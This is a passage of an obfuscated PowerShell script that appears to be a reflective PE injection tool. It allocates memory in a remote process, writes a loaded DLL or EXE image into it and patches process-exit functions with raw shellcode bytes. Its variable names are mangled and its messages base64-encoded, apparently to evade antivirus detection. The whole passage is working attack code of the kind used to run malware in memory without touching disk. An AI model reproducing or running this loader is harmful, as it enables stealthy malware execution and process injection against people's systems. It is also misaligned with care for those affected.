				$Win32Func.VirtualProtect.Invoke(${_____/===\/\___/=}, [UInt32]${____/\__/\_/==\/=}, [UInt32](${__/=\_/=\_/\/\/=\}), [Ref]${__/=\_/=\_/\/\/=\}) | Out-Null
				${__/=====\__/\__/\} = $Win32Func.VirtualProtect.Invoke(${_/===\_/=\_/=\_/\}, [UInt32]${____/\__/\_/==\/=}, [UInt32]($Win32Const.PAGE_EXECUTE_READWRITE), [Ref]${__/=\_/=\_/\/\/=\})
				if (${__/=====\__/\__/\} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/===\_/====\/\__/}, ${_/===\_/=\_/=\_/\}, $false)
				$Win32Func.VirtualProtect.Invoke(${_/===\_/=\_/=\_/\}, [UInt32]${____/\__/\_/==\/=}, [UInt32](${__/=\_/=\_/\/\/=\}), [Ref]${__/=\_/=\_/\/\/=\}) | Out-Null
			}
		}
		${___/=\/=\_/\__/==} = @()
		${/=\/=\__/\_/===\_} = @() 
		[IntPtr]${/===\/\/\/\/==\_/} = $Win32Func.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${/===\/\/\/\/==\_/} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${__/\_/==\_/\___/\} = $Win32Func.GetProcAddr.Invoke(${/===\/\/\/\/==\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${__/\_/==\_/\___/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/=\/=\__/\_/===\_} += ${__/\_/==\_/\___/\}
		[IntPtr]${/=\_/\_/==\_/\_/=} = $Win32Func.GetProcAddr.Invoke(${_/\/=\/\/\/===\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${/=\_/\_/==\_/\_/=} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/=\/=\__/\_/===\_} += ${/=\_/\_/==\_/\_/=}
		[UInt32]${__/=\_/=\_/\/\/=\} = 0
		foreach (${/==\__/==\___/\/=} in ${/=\/=\__/\_/===\_})
		{
			${_/=\/\__/\/=\_/==} = ${/==\__/==\___/\/=}
			[Byte[]]${_/=\/\/=\__/\_/\_} = @(0xbb)
			[Byte[]]${______/\___/\_/==} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${____/\__/\_/==\/=} -eq 8)
			{
				[Byte[]]${_/=\/\/=\__/\_/\_} = @(0x48, 0xbb)
				[Byte[]]${______/\___/\_/==} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${/\______/\/=\_/=\} = @(0xff, 0xd3)
			${/===\__/==\/====\} = ${_/=\/\/=\__/\_/\_}.Length + ${____/\__/\_/==\/=} + ${______/\___/\_/==}.Length + ${____/\__/\_/==\/=} + ${/\______/\/=\_/=\}.Length
			[IntPtr]${____/=\_/=\__/===} = $Win32Func.GetProcAddr.Invoke(${_/\/=\/\/\/===\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${____/=\_/=\__/===} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${__/=====\__/\__/\} = $Win32Func.VirtualProtect.Invoke(${/==\__/==\___/\/=}, [UInt32]${/===\__/==\/====\}, [UInt32]$Win32Const.PAGE_EXECUTE_READWRITE, [Ref]${__/=\_/=\_/\/\/=\})
			if (${__/=====\__/\__/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${___/\/=\/===\/\/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/===\__/==\/====\})
			$Win32Func.memcpy.Invoke(${___/\/=\/===\/\/\}, ${/==\__/==\___/\/=}, [UInt64]${/===\__/==\/====\}) | Out-Null
			${___/=\/=\_/\__/==} += ,(${/==\__/==\___/\/=}, ${___/\/=\/===\/\/\}, ${/===\__/==\/====\})
			___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/=\/\/=\__/\_/\_} -____/\/====\__/==\ ${_/=\/\__/\/=\_/==}
			${_/=\/\__/\/=\_/==} = __/\______/=\___/\ ${_/=\/\__/\/=\_/==} (${_/=\/\/=\__/\_/\_}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\/==\_/\__/\/==}, ${_/=\/\__/\/=\_/==}, $false)
			${_/=\/\__/\/=\_/==} = __/\______/=\___/\ ${_/=\/\__/\/=\_/==} ${____/\__/\_/==\/=}
			___/===\_/\/=\__/\ -_/====\____/\___/\ ${______/\___/\_/==} -____/\/====\__/==\ ${_/=\/\__/\/=\_/==}
			${_/=\/\__/\/=\_/==} = __/\______/=\___/\ ${_/=\/\__/\/=\_/==} (${______/\___/\_/==}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${____/=\_/=\__/===}, ${_/=\/\__/\/=\_/==}, $false)
			${_/=\/\__/\/=\_/==} = __/\______/=\___/\ ${_/=\/\__/\/=\_/==} ${____/\__/\_/==\/=}
			___/===\_/\/=\__/\ -_/====\____/\___/\ ${/\______/\/=\_/=\} -____/\/====\__/==\ ${_/=\/\__/\/=\_/==}
			$Win32Func.VirtualProtect.Invoke(${/==\__/==\___/\/=}, [UInt32]${/===\__/==\/====\}, [UInt32]${__/=\_/=\_/\/\/=\}, [Ref]${__/=\_/=\_/\/\/=\}) | Out-Null
		}
		echo ${___/=\/=\_/\__/==}
	}
	Function _____/\_/\/\_/\_/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${_____/==========\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Func,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Const
		)
		[UInt32]${__/=\_/=\_/\/\/=\} = 0
		foreach (${/=====\/====\/===} in ${_____/==========\_})
		{
			${__/=====\__/\__/\} = $Win32Func.VirtualProtect.Invoke(${/=====\/====\/===}[0], [UInt32]${/=====\/====\/===}[2], [UInt32]$Win32Const.PAGE_EXECUTE_READWRITE, [Ref]${__/=\_/=\_/\/\/=\})
			if (${__/=====\__/\__/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			$Win32Func.memcpy.Invoke(${/=====\/====\/===}[0], ${/=====\/====\/===}[1], [UInt64]${/=====\/====\/===}[2]) | Out-Null
			$Win32Func.VirtualProtect.Invoke(${/=====\/====\/===}[0], [UInt32]${/=====\/====\/===}[2], [UInt32]${__/=\_/=\_/\/\/=\}, [Ref]${__/=\_/=\_/\/\/=\}) | Out-Null
		}
	}
	Function __/==\/=\/=\/\__/=
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${_/====\___/\__/=\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${_____/=\/=\/\___/=}
		)
		$Win32Types = _/=\/\/=\_/=\_/\__
		$Win32Const = Get-Win32Constants
		${__/\___/===\/\/=\/} = _/==\/\_/\/\_/\_/= -_/====\___/\__/=\/ ${_/====\___/\__/=\/} -Win32Types $Win32Types -Win32Constants $Win32Const
		if (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${/=\_/\/========\_} = __/\______/=\___/\ (${_/====\___/\__/=\/}) (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${/===\_/\_/\/=\_/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\_/\/========\_}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${/=\__/=\/\_/=\__/} = 0; ${/=\__/=\/\_/=\__/} -lt ${/===\_/\_/\/=\_/=}.NumberOfNames; ${/=\__/=\/\_/=\__/}++)
		{
			${___/==\___/\/====} = __/\______/=\___/\ (${_/====\___/\__/=\/}) (${/===\_/\_/\/=\_/=}.AddressOfNames + (${/=\__/=\/\_/=\__/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${______/=\/\/\_/\/} = __/\______/=\___/\ (${_/====\___/\__/=\/}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/==\___/\/====}, [Type][UInt32]))
			${/=\___/\/=\/=\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${______/=\/\/\_/\/})
			if (${/=\___/\/=\/=\__/} -ceq ${_____/=\/=\/\___/=})
			{
				${__/=\/\_/\____/=\} = __/\______/=\___/\ (${_/====\___/\__/=\/}) (${/===\_/\_/\/=\_/=}.AddressOfNameOrdinals + (${/=\__/=\/\_/=\__/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${/==\/\__/\_____/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\/\_/\____/=\}, [Type][UInt16])
				${__/=\__/===\/=\/=} = __/\______/=\___/\ (${_/====\___/\__/=\/}) (${/===\_/\_/\/=\_/=}.AddressOfFunctions + (${/==\/\__/\_____/=} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${__/\/===\/=\/=\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\__/===\/=\/=}, [Type][UInt32])
				return __/\______/=\___/\ (${_/====\___/\__/=\/}) (${__/\/===\/=\/=\/\})
			}
		}
		return [IntPtr]::Zero
	}
	Function _____/=\__/=\/=\/=
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${_____/=\___/=\/\/=},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${____/====\/====\_/},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${__/\_/\__/=\/=\_/\}
		)
		${____/\__/\_/==\/=} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Const = Get-Win32Constants
		$Win32Func = ___/\/\_/\/======\
		$Win32Types = _/=\/\/=\_/=\_/\__
		${_/===\__/\_____/\} = $false
		if ((${__/\_/\__/=\/=\_/\} -ne $null) -and (${__/\_/\__/=\/=\_/\} -ne [IntPtr]::Zero))
		{
			${_/===\__/\_____/\} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${__/\___/===\/\/=\/} = __/=\_____/======\ -_____/=\___/=\/\/= ${_____/=\___/=\/\/=} -Win32Types $Win32Types
		${___/=\/\__/=\/=\/\} = ${__/\___/===\/\/=\/}.OriginalImageBase
		${___/\/\_/==\/=\_/} = $true
		if (([Int] ${__/\___/===\/\/=\/}.DllCharacteristics -band $Win32Const.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Const.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${___/\/\_/==\/=\_/} = $false
		}
		${_______/\/=\/=\__} = $true
		if (${_/===\__/\_____/\} -eq $true)
		{
			${_/\/=\/\/\/===\/\} = $Win32Func.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${__/=\/==\____/\/\} = $Win32Func.GetProcAddr.Invoke(${_/\/=\/\/\/===\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${__/=\/==\____/\/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${_/\/\/\__/==\/=\/} = $false
			${__/=====\__/\__/\} = $Win32Func.IsWow64Process.Invoke(${__/\_/\__/=\/=\_/\}, [Ref]${_/\/\/\__/==\/=\/})
			if (${__/=====\__/\__/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${_/\/\/\__/==\/=\/} -eq $true) -or ((${_/\/\/\__/==\/=\/} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${_______/\/=\/=\__} = $false
			}
			${_/\_/\/=\_/=\___/} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${_/\_/\/=\_/=\___/} = $false
			}
			if (${_/\_/\/=\_/=\___/} -ne ${_______/\/=\/=\__})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${_______/\/=\/=\__} = $false
			}
		}
		if (${_______/\/=\/=\__} -ne ${__/\___/===\/\/=\/}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${__/==\/==\___/\_/} = [IntPtr]::Zero
		if (([Int] ${__/\___/===\/\/=\/}.DllCharacteristics -band $Win32Const.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Const.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuAA=='))) -WarningAction Continue
			[IntPtr]${__/==\/==\___/\_/} = ${___/=\/\__/=\/=\/\}
		}
		${_/====\___/\__/=\/} = [IntPtr]::Zero				
		${____/=\_/==\/=\_/} = [IntPtr]::Zero		
		if (${_/===\__/\_____/\} -eq $true)
		{
			${_/====\___/\__/=\/} = $Win32Func.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${__/\___/===\/\/=\/}.SizeOfImage, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_READWRITE)
			${____/=\_/==\/=\_/} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, ${__/==\/==\___/\_/}, [UIntPtr]${__/\___/===\/\/=\/}.SizeOfImage, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_EXECUTE_READWRITE)
			if (${____/=\_/==\/=\_/} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${___/\/\_/==\/=\_/} -eq $true)
			{
				${_/====\___/\__/=\/} = $Win32Func.VirtualAlloc.Invoke(${__/==\/==\___/\_/}, [UIntPtr]${__/\___/===\/\/=\/}.SizeOfImage, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_READWRITE)
			}
			else
			{
				${_/====\___/\__/=\/} = $Win32Func.VirtualAlloc.Invoke(${__/==\/==\___/\_/}, [UIntPtr]${__/\___/===\/\/=\/}.SizeOfImage, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_EXECUTE_READWRITE)
			}
			${____/=\_/==\/=\_/} = ${_/====\___/\__/=\/}
		}
		[IntPtr]${_/=\____/\_/=\_/=} = __/\______/=\___/\ (${_/====\___/\__/=\/}) ([Int64]${__/\___/===\/\/=\/}.SizeOfImage)
		if (${_/====\___/\__/=\/} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${_____/=\___/=\/\/=}, 0, ${_/====\___/\__/=\/}, ${__/\___/===\/\/=\/}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${__/\___/===\/\/=\/} = _/==\/\_/\/\_/\_/= -_/====\___/\__/=\/ ${_/====\___/\__/=\/} -Win32Types $Win32Types -Win32Constants $Win32Const
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${_/=\____/\_/=\_/=}
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${____/=\_/==\/=\_/}
		Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AEEAZABkAHIAOgAgACQAUABFAEgAYQBuAGQAbABlACAAIAAgACAARQBuAGQAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AC8APQA9AD0APQA9AD0AXAAvAFwALwBcAC8AXAAvAD0AXAB9AA==')))
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		__/===\_/\/=\_/\__ -_____/=\___/=\/\/= ${_____/=\___/=\/\/=} -PEInfo ${__/\___/===\/\/=\/} -Win32Func $Win32Func -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		__/\/=\/=\/=\/==\/ -PEInfo ${__/\___/===\/\/=\/} -___/=\/\__/=\/=\/\ ${___/=\/\__/=\/=\/\} -Win32Constants $Win32Const -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${_/===\__/\_____/\} -eq $true)
		{
			_/===\__/=\___/=\_ -PEInfo ${__/\___/===\/\/=\/} -Win32Func $Win32Func -Win32Types $Win32Types -Win32Constants $Win32Const -__/\_/\__/=\/=\_/\ ${__/\_/\__/=\/=\_/\}
		}
		else
		{
			_/===\__/=\___/=\_ -PEInfo ${__/\___/===\/\/=\/} -Win32Func $Win32Func -Win32Types $Win32Types -Win32Constants $Win32Const
		}
		if (${_/===\__/\_____/\} -eq $false)
		{
			if (${___/\/\_/==\/=\_/} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				__/\_/===\/=\_/==\ -PEInfo ${__/\___/===\/\/=\/} -Win32Func $Win32Func -Win32Constants $Win32Const -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${_/===\__/\_____/\} -eq $true)
		{
			[UInt32]${_/=\/===\_/==\__/} = 0
			${__/=====\__/\__/\} = $Win32Func.WriteProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${____/=\_/==\/=\_/}, ${_/====\___/\__/=\/}, [UIntPtr](${__/\___/===\/\/=\/}.SizeOfImage), [Ref]${_/=\/===\_/==\__/})
			if (${__/=====\__/\__/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${__/\___/===\/\/=\/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${_/===\__/\_____/\} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${_/\/\/\__/\__/===} = __/\______/=\___/\ (${__/\___/===\/\/=\/}.PEHandle) (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${/=\__/=\/====\___} = __/\/==\__/=\/===\ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${/====\/\/\/==\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\/\__/\__/===}, ${/=\__/=\/====\___})
				${/====\/\/\/==\__/}.Invoke(${__/\___/===\/\/=\/}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${_/\/\/\__/\__/===} = __/\______/=\___/\ (${____/=\_/==\/=\_/}) (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${__/\___/===\/\/=\/}.PE64Bit -eq $true)
				{
					${__/\_/\/===\/\/\/} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${_/\_/\_/\/\__/=\/} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${/==\___/=\_/\_/\/} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${__/\_/\/===\/\/\/} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
